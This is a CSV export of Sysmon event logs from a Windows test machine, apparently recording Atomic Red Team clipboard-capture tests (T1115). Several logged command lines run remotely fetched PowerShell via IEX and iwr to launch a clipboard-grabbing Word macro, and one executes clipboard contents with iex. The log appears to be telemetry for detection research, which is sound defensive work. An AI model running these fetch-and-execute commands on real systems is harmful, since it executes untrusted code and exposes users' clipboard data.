Channel,CommandLine,Company,Computer,CreationUtcTime,CurrentDirectory,Description,EventID,EventRecordID,FileVersion,Hashes,Image,IntegrityLevel,Keywords,Level,LogonGuid,LogonId,Message,Opcode,OriginalFileName,ParentCommandLine,ParentImage,ParentProcessGuid,ParentProcessId,ParentUser,ProcessGuid,ProcessID,ProcessId,Product,QueryName,QueryResults,QueryStatus,RenderingInfo,RuleName,SystemTime,TargetFilename,Task,TerminalSessionId,ThreadID,User,UserID,UtcTime,Version,raw
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,22,19582,,,<unknown process>,,0x8000000000000000,Information,,,"Dns query:

RuleName: -

UtcTime: 2023-12-27 14:52:08.630

ProcessGuid: {f57bd86a-931d-658c-cd01-000000000f00}

ProcessId: 1204

QueryName: raw.githubusercontent.com

QueryStatus: 0

QueryResults: ::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;::ffff:185.199.111.133;

Image: <unknown process>

User: WINDEV2309EVAL\User",Info,,,,,,,{f57bd86a-931d-658c-cd01-000000000f00},3588,1204,,raw.githubusercontent.com,::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;::ffff:185.199.111.133;,0,"
      ",-,2023-12-27T21:11:59.9779475Z,,Dns query (rule: DnsQuery),,5164,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 14:52:08.630,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>22</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>22</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T21:11:59.9779475Z""/>
      <EventRecordID>19582</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5164""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 14:52:08.630</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-931d-658c-cd01-000000000f00}</Data>
      <Data Name=""ProcessId"">1204</Data>
      <Data Name=""QueryName"">raw.githubusercontent.com</Data>
      <Data Name=""QueryStatus"">0</Data>
      <Data Name=""QueryResults"">::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;::ffff:185.199.111.133;</Data>
      <Data Name=""Image"">&lt;unknown process&gt;</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Dns query:

RuleName: -

UtcTime: 2023-12-27 14:52:08.630

ProcessGuid: {f57bd86a-931d-658c-cd01-000000000f00}

ProcessId: 1204

QueryName: raw.githubusercontent.com

QueryStatus: 0

QueryResults: ::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;::ffff:185.199.111.133;

Image: &lt;unknown process&gt;

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Dns query (rule: DnsQuery)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 21:11:57.502,,,11,19581,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,0x8000000000000000,Information,,,"File created:

RuleName: -

UtcTime: 2023-12-27 21:11:57.502

ProcessGuid: {f57bd86a-931d-658c-cd01-000000000f00}

ProcessId: 1204

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_2223c4uc.0ch.ps1

CreationUtcTime: 2023-12-27 21:11:57.502

User: WINDEV2309EVAL\User",Info,,,,,,,{f57bd86a-931d-658c-cd01-000000000f00},3588,1204,,,,,"
      ",-,2023-12-27T21:11:57.5033649Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_2223c4uc.0ch.ps1,File created (rule: FileCreate),,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 21:11:57.502,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T21:11:57.5033649Z""/>
      <EventRecordID>19581</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 21:11:57.502</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-931d-658c-cd01-000000000f00}</Data>
      <Data Name=""ProcessId"">1204</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_2223c4uc.0ch.ps1</Data>
      <Data Name=""CreationUtcTime"">2023-12-27 21:11:57.502</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: -

UtcTime: 2023-12-27 21:11:57.502

ProcessGuid: {f57bd86a-931d-658c-cd01-000000000f00}

ProcessId: 1204

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_2223c4uc.0ch.ps1

CreationUtcTime: 2023-12-27 21:11:57.502

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Set-Clipboard -value \""""Atomic T1115 Test, grab data from clipboard via VBA\""""
IEX (iwr \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"""" -UseBasicParsing)
Invoke-Maldoc -macroFile \""""C:\AtomicRedTeam\atomics\T1115\src\T1115-macrocode.txt\"""" -officeProduct \""""Word\"""" -sub \""""GetClipboard\""""}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,1,19580,10.0.22621.2506 (WinBuild.160101.0800),"MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 21:11:57.396

ProcessGuid: {f57bd86a-931d-658c-cd01-000000000f00}

ProcessId: 1204

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Set-Clipboard -value \""""Atomic T1115 Test, grab data from clipboard via VBA\""""
IEX (iwr \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"""" -UseBasicParsing)
Invoke-Maldoc -macroFile \""""C:\AtomicRedTeam\atomics\T1115\src\T1115-macrocode.txt\"""" -officeProduct \""""Word\"""" -sub \""""GetClipboard\""""}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -",Info,PowerShell.EXE,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-931d-658c-cd01-000000000f00},3588,1204,Microsoft® Windows® Operating System,,,,"
      ",-,2023-12-27T21:11:57.3975692Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 21:11:57.396,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T21:11:57.3975692Z""/>
      <EventRecordID>19580</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 21:11:57.396</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-931d-658c-cd01-000000000f00}</Data>
      <Data Name=""ProcessId"">1204</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows PowerShell</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Set-Clipboard -value \""""Atomic T1115 Test, grab data from clipboard via VBA\""""
IEX (iwr \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"""" -UseBasicParsing)
Invoke-Maldoc -macroFile \""""C:\AtomicRedTeam\atomics\T1115\src\T1115-macrocode.txt\"""" -officeProduct \""""Word\"""" -sub \""""GetClipboard\""""}</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">1688</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 21:11:57.396

ProcessGuid: {f57bd86a-931d-658c-cd01-000000000f00}

ProcessId: 1204

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" &amp; {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Set-Clipboard -value \""""Atomic T1115 Test, grab data from clipboard via VBA\""""
IEX (iwr \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"""" -UseBasicParsing)
Invoke-Maldoc -macroFile \""""C:\AtomicRedTeam\atomics\T1115\src\T1115-macrocode.txt\"""" -officeProduct \""""Word\"""" -sub \""""GetClipboard\""""}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Windows\system32\clip.exe""",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Clip - copies the data into clipboard,1,19579,10.0.22621.1 (WinBuild.160101.0800),"MD5=C2F44EA3178B834CA71418841238D09F,SHA256=3CFC03AC663A4EA6B078EEB2FD9245294DEE402376C52EBFEF3A218CBBDBAEFC,IMPHASH=FFEDF33A1AF6412E26F1F659C12D5FF7",C:\Windows\System32\clip.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 21:11:55.704

ProcessGuid: {f57bd86a-931b-658c-cc01-000000000f00}

ProcessId: 8016

Image: C:\Windows\System32\clip.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Clip - copies the data into clipboard

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: clip.exe

CommandLine: ""C:\Windows\system32\clip.exe""

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=C2F44EA3178B834CA71418841238D09F,SHA256=3CFC03AC663A4EA6B078EEB2FD9245294DEE402376C52EBFEF3A218CBBDBAEFC,IMPHASH=FFEDF33A1AF6412E26F1F659C12D5FF7

ParentProcessGuid: {f57bd86a-931a-658c-ca01-000000000f00}

ParentProcessId: 1656

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""powershell.exe"" & {echo Get-Process | clip
Get-Clipboard | iex}

ParentUser: WINDEV2309EVAL\User",Info,clip.exe,"""powershell.exe"" & {echo Get-Process | clip
Get-Clipboard | iex}",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{f57bd86a-931a-658c-ca01-000000000f00},1656,WINDEV2309EVAL\User,{f57bd86a-931b-658c-cc01-000000000f00},3588,8016,Microsoft® Windows® Operating System,,,,"
      ",-,2023-12-27T21:11:55.7050876Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 21:11:55.704,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T21:11:55.7050876Z""/>
      <EventRecordID>19579</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 21:11:55.704</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-931b-658c-cc01-000000000f00}</Data>
      <Data Name=""ProcessId"">8016</Data>
      <Data Name=""Image"">C:\Windows\System32\clip.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Clip - copies the data into clipboard</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">clip.exe</Data>
      <Data Name=""CommandLine"">""C:\Windows\system32\clip.exe""</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=C2F44EA3178B834CA71418841238D09F,SHA256=3CFC03AC663A4EA6B078EEB2FD9245294DEE402376C52EBFEF3A218CBBDBAEFC,IMPHASH=FFEDF33A1AF6412E26F1F659C12D5FF7</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-931a-658c-ca01-000000000f00}</Data>
      <Data Name=""ParentProcessId"">1656</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""ParentCommandLine"">""powershell.exe"" &amp; {echo Get-Process | clip
Get-Clipboard | iex}</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 21:11:55.704

ProcessGuid: {f57bd86a-931b-658c-cc01-000000000f00}

ProcessId: 8016

Image: C:\Windows\System32\clip.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Clip - copies the data into clipboard

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: clip.exe

CommandLine: ""C:\Windows\system32\clip.exe""

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=C2F44EA3178B834CA71418841238D09F,SHA256=3CFC03AC663A4EA6B078EEB2FD9245294DEE402376C52EBFEF3A218CBBDBAEFC,IMPHASH=FFEDF33A1AF6412E26F1F659C12D5FF7

ParentProcessGuid: {f57bd86a-931a-658c-ca01-000000000f00}

ParentProcessId: 1656

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""powershell.exe"" &amp; {echo Get-Process | clip
Get-Clipboard | iex}

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 21:11:54.160,,,11,19578,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,0x8000000000000000,Information,,,"File created:

RuleName: -

UtcTime: 2023-12-27 21:11:54.160

ProcessGuid: {f57bd86a-931a-658c-ca01-000000000f00}

ProcessId: 1656

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_xjh15n3s.3zw.ps1

CreationUtcTime: 2023-12-27 21:11:54.160

User: WINDEV2309EVAL\User",Info,,,,,,,{f57bd86a-931a-658c-ca01-000000000f00},3588,1656,,,,,"
      ",-,2023-12-27T21:11:54.1678629Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_xjh15n3s.3zw.ps1,File created (rule: FileCreate),,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 21:11:54.160,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T21:11:54.1678629Z""/>
      <EventRecordID>19578</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 21:11:54.160</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-931a-658c-ca01-000000000f00}</Data>
      <Data Name=""ProcessId"">1656</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_xjh15n3s.3zw.ps1</Data>
      <Data Name=""CreationUtcTime"">2023-12-27 21:11:54.160</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: -

UtcTime: 2023-12-27 21:11:54.160

ProcessGuid: {f57bd86a-931a-658c-ca01-000000000f00}

ProcessId: 1656

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_xjh15n3s.3zw.ps1

CreationUtcTime: 2023-12-27 21:11:54.160

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {echo Get-Process | clip
Get-Clipboard | iex}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,1,19577,10.0.22621.2506 (WinBuild.160101.0800),"MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 21:11:54.021

ProcessGuid: {f57bd86a-931a-658c-ca01-000000000f00}

ProcessId: 1656

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" & {echo Get-Process | clip
Get-Clipboard | iex}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -",Info,PowerShell.EXE,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-931a-658c-ca01-000000000f00},3588,1656,Microsoft® Windows® Operating System,,,,"
      ",-,2023-12-27T21:11:54.0226297Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 21:11:54.021,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T21:11:54.0226297Z""/>
      <EventRecordID>19577</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 21:11:54.021</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-931a-658c-ca01-000000000f00}</Data>
      <Data Name=""ProcessId"">1656</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows PowerShell</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {echo Get-Process | clip
Get-Clipboard | iex}</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">1688</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 21:11:54.021

ProcessGuid: {f57bd86a-931a-658c-ca01-000000000f00}

ProcessId: 1656

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" &amp; {echo Get-Process | clip
Get-Clipboard | iex}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,clip  ,Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Clip - copies the data into clipboard,1,19576,10.0.22621.1 (WinBuild.160101.0800),"MD5=C2F44EA3178B834CA71418841238D09F,SHA256=3CFC03AC663A4EA6B078EEB2FD9245294DEE402376C52EBFEF3A218CBBDBAEFC,IMPHASH=FFEDF33A1AF6412E26F1F659C12D5FF7",C:\Windows\System32\clip.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 21:11:52.894

ProcessGuid: {f57bd86a-9318-658c-c901-000000000f00}

ProcessId: 9916

Image: C:\Windows\System32\clip.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Clip - copies the data into clipboard

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: clip.exe

CommandLine: clip  

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

